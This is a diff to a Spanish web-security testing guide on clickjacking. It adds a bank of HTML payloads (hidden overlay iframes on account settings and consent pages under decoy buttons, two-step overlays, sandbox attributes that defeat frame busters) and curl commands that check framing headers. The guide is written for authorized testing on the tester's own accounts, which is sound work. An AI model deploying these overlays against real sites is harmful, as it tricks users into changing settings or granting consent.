@@ -8,7 +8,75 @@
 - Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
 - Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.
 
-## 🔬 Pruebas por escenario
+> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.
+
+## 💉 Payloads básicos
+
+### Comprobar framing de páginas sensibles
+
+```html
+<iframe src="https://{ORIGEN}/account/settings" width="1000" height="700"></iframe>
+<iframe src="https://{ORIGEN}/account/consent" width="1000" height="700"></iframe>
+```
+
+**Cuándo usarlo:** Elegir la ruta real con una acción reversible. Que la página cargue en iframe es una precondición; confirmar también que se puede accionar.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/clickjacking).
+
+
+## 🧭 Payloads por contexto
+
+### Superposición y clic único
+
+```html
+<button style="position:absolute;left:{X}px;top:{Y}px">Ver prueba</button><iframe style="position:absolute;left:0;top:0;width:1000px;height:700px;opacity:.05;z-index:2" src="https://{ORIGEN}/account/settings"></iframe>
+<button style="position:absolute;left:{X}px;top:{Y}px">Continuar</button><iframe style="position:absolute;left:0;top:0;width:1000px;height:700px;opacity:.2;z-index:2" src="https://{ORIGEN}/account/consent"></iframe>
+```
+
+**Cuándo usarlo:** Son variantes alternativas. Medir coordenadas y viewport en cuenta propia; algunos navegadores limitan frames casi transparentes.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/clickjacking).
+
+
+### Formulario prellenado y dos pasos
+
+```html
+<iframe src="https://{ORIGEN}/account/settings?displayName=canary-123" width="1000" height="700"></iframe>
+<button style="position:absolute;left:{X1}px;top:{Y1}px">Paso 1</button><button style="position:absolute;left:{X2}px;top:{Y2}px">Paso 2</button><iframe style="position:absolute;left:0;top:0;opacity:.05;z-index:2;width:1000px;height:700px" src="https://{ORIGEN}/account/settings"></iframe>
+```
+
+**Cuándo usarlo:** La primera exige que el GET rellene un campo; la segunda requiere dos acciones medidas por separado. Restaurar cambios de la cuenta de prueba.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/clickjacking).
+
+
+## 🔥 Payloads avanzados
+
+### Frame buster y sandbox
+
+```html
+<iframe src="https://{ORIGEN}/account/settings" sandbox="allow-forms" width="1000" height="700"></iframe>
+<iframe src="https://{ORIGEN}/account/settings" sandbox="allow-scripts" width="1000" height="700"></iframe>
+```
+
+**Cuándo usarlo:** La primera permite formularios pero no scripts; la segunda, scripts pero no formularios. Ninguna elude frame-ancestors o X-Frame-Options válidos.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/clickjacking).
+
+
+### Política efectiva en la respuesta
+
+```bash
+curl -si "https://{ORIGEN}/account/settings" | rg -i 'content-security-policy|x-frame-options'
+curl -si "https://{ORIGEN}/account/consent" | rg -i 'content-security-policy|x-frame-options'
+```
+
+**Cuándo usarlo:** Comparar la ruta exacta y el navegador. Un header ausente, o un onload de iframe, no basta para demostrar la acción.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/clickjacking).
+
+
+## 🔬 Pruebas guiadas por escenario
 
 ### 1. Framing básico
 
@@ -20,7 +88,7 @@
 
 **Interpretación:** Framing permitido es precondición; demostrar además una acción sensible reversible.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/clickjacking).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).
 
 ### 2. Superposición de un clic
 
@@ -32,7 +100,7 @@
 
 **Interpretación:** Sustituir coordenadas por medidas de la vista propia; un clic debe accionar solo el control autorizado.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/clickjacking).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).
 
 ### 3. Formulario prellenado
 
@@ -44,7 +112,7 @@
 
 **Interpretación:** La pre-carga y el clic final deben verificarse; un query ignorado no crea impacto.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/clickjacking).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).
 
 ### 4. Dos pasos
 
@@ -56,7 +124,7 @@
 
 **Interpretación:** Ambos clics se reproducen solo en la cuenta de prueba; medir desplazamientos tras el primero.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/clickjacking).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).
 
 ### 5. Cabeceras de la ruta
 
@@ -68,7 +136,7 @@ curl -sSI "https://{ORIGEN}/account/settings" | rg -i 'content-security-policy|x
 
 **Interpretación:** La ausencia de headers no es hallazgo sin framing y acción; la respuesta HEAD puede diferir de GET.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/clickjacking).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).
 
 ### 6. Protección por CSP en iframe
 
@@ -80,7 +148,7 @@ curl -sSI "https://{ORIGEN}/account/settings" | rg -i 'content-security-policy|x
 
 **Interpretación:** onload por sí solo no prueba que se haya renderizado el documento; comprobar consola del navegador por frame-ancestors.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/clickjacking).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).
 
 ### 7. Frame buster bajo sandbox
 
@@ -92,7 +160,7 @@ curl -sSI "https://{ORIGEN}/account/settings" | rg -i 'content-security-policy|x
 
 **Interpretación:** Solo aplica si la ruta es frameable y la acción funciona con scripts deshabilitados; comprobar el clic en cuenta propia.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/clickjacking).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).
 
 ### 8. Click sobre enlace DOM
 
@@ -104,7 +172,7 @@ curl -sSI "https://{ORIGEN}/account/settings" | rg -i 'content-security-policy|x
 
 **Interpretación:** Solo aplica si la página convierte el fragmento en un enlace HTML clicable; medir su posición y confirmar el efecto en cuenta propia.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/clickjacking).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).
 
 ## ✅ Evidencia mínima
 
